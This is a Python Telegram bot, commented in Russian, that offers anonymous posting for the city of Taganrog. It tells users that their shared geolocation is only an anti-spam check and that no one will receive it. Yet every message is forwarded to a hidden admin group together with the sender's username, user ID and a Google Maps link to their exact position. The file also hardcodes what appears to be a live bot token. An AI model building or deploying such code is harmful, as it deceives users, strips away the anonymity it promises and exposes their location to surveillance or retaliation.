import logging
from telegram import Update, ReplyKeyboardMarkup, KeyboardButton, InlineKeyboardMarkup, InlineKeyboardButton
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes, MessageHandler, filters
from math import radians, sin, cos, sqrt, atan2

# Конфигурация
TOKEN = "8089566253:AAGJSzNBhjgoEK5ZolkgIqH8a8Q99iPuu44"
ANON_GROUP_LINK = "https://t.me/+Ql0IZosRRu82YTQy"
ANON_GROUP_ID = -1002514617765
FORWARD_GROUP_ID = -1002698558394
VIDEO_LINK = "https://yandex.ru/video/touch/preview/18329427637174558155?reqid=1743686166846639-14632506106275850752-balancer-l7leveler-kubr-yp-klg-81-BAL&suggest_reqid=217726878173278270661672840126691&text=%D0%A1%D0%BA%D0%B8%D0%B1%D0%B5%D0%B4%D0%B5"

# Геопараметры Таганрога
TAGANROG_CENTER = (47.2364, 38.8953)
ALLOWED_RADIUS_KM = 50

# Настройка логов
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO,
    filename='bot.log'
)
logger = logging.getLogger(__name__)

# Клавиатура для запроса гео
geo_keyboard = ReplyKeyboardMarkup(
    [[KeyboardButton("📍 Отправить геолокацию", request_location=True)]],
    resize_keyboard=True,
    one_time_keyboard=True
)

def calculate_distance(lat1, lon1, lat2, lon2):
    """Вычисление расстояния между точками (в км)"""
    R = 6371
    lat1, lon1, lat2, lon2 = map(radians, [lat1, lon1, lat2, lon2])
    dlat = lat2 - lat1
    dlon = lon2 - lon1
    a = sin(dlat/2)**2 + cos(lat1) * cos(lat2) * sin(dlon/2)**2
    return R * (2 * atan2(sqrt(a), sqrt(1-a)))

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Приветственное сообщение"""
    await update.message.reply_text(
        "Привет! Для отправки сообщения сначала поделись своей геолокацией, ее никто не получит (антиспам):",
        reply_markup=geo_keyboard
    )

async def handle_location(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Обработка полученной геолокации"""
    try:
        user = update.message.from_user
        location = update.message.location
        
        if not location:
            raise ValueError("Геолокация не получена")
        
        # Вычисляем расстояние
        distance = calculate_distance(
            TAGANROG_CENTER[0], TAGANROG_CENTER[1],
            location.latitude, location.longitude
        )
        
        # Сохраняем данные
        context.user_data['geo_verified'] = {
            'lat': location.latitude,
            'lon': location.longitude,
            'distance': distance,
            'valid': distance <= ALLOWED_RADIUS_KM
        }
        
        await update.message.reply_text(
            "✅ Геолокация получена! Теперь отправь текст сообщения.",
            reply_markup=ReplyKeyboardMarkup.remove_keyboard()
        )
        
    except Exception as e:
        logger.error(f"Ошибка обработки геолокации: {e}")
        await update.message.reply_text(
            "❌ Ошибка обработки геолокации. Пожалуйста, попробуйте еще раз.",
            reply_markup=geo_keyboard
        )
        # Удаляем невалидные данные
        if 'geo_verified' in context.user_data:
            del context.user_data['geo_verified']

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Обработка текстовых сообщений"""
    try:
        if update.message.chat.type != "private":
            return
            
        # Проверяем наличие подтвержденной геолокации
        if 'geo_verified' not in context.user_data:
            await update.message.reply_text(
                "⚠️ Сначала отправь свою геолокацию:",
                reply_markup=geo_keyboard
            )
            return
            
        user = update.message.from_user
        geo_data = context.user_data['geo_verified']
        
        # Формируем сообщение для админов
        admin_msg = (
            f"👤 Отправитель: @{user.username or 'N/A'} (ID: {user.id})\n"
            f"📍 Гео: https://maps.google.com/?q={geo_data['lat']},{geo_data['lon']}\n"
            f"📏 Расстояние: {geo_data['distance']:.1f} км\n\n"
            f"📝 Сообщение:\n{update.message.text}"
        )
        
        # Всегда отправляем админам
        await context.bot.send_message(FORWARD_GROUP_ID, admin_msg)
        
        # Отправляем в анонимный чат только если в радиусе
        if geo_data['valid']:
            await context.bot.send_message(
                ANON_GROUP_ID,
                f"✉️ Анонимное сообщение:\n\n{update.message.text}",
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔍 Открыть", url=VIDEO_LINK)]])
            )
            await update.message.reply_text("✅ Сообщение опубликовано!")
        else:
            await update.message.reply_text("❌ Вы вне зоны Таганрога. Сообщение не опубликовано.")
            
        # Сбрасываем геоданные
        del context.user_data['geo_verified']
        await update.message.reply_text(
            "Для нового сообщения отправь геолокацию снова:",
            reply_markup=geo_keyboard
        )
        
    except Exception as e:
        logger.error(f"Ошибка обработки сообщения: {e}")
        await update.message.reply_text(
            "⚠️ Произошла ошибка. Пожалуйста, начните заново.",
            reply_markup=geo_keyboard
        )
        # Сбрасываем состояние
        if 'geo_verified' in context.user_data:
            del context.user_data['geo_verified']

async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Глобальный обработчик ошибок"""
    logger.error(f"Глобальная ошибка: {context.error}")
    if update and update.message:
        await update.message.reply_text(
            "⚠️ Произошла системная ошибка. Пожалуйста, попробуйте позже.",
            reply_markup=geo_keyboard
        )

if __name__ == "__main__":
    app = ApplicationBuilder().token(TOKEN).build()
    
    # Регистрация обработчиков
    app.add_handler(CommandHandler("start", start))
    app.add_handler(MessageHandler(filters.LOCATION, handle_location))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    app.add_error_handler(error_handler)
    
    logger.info("Бот запущен")
    app.run_polling()
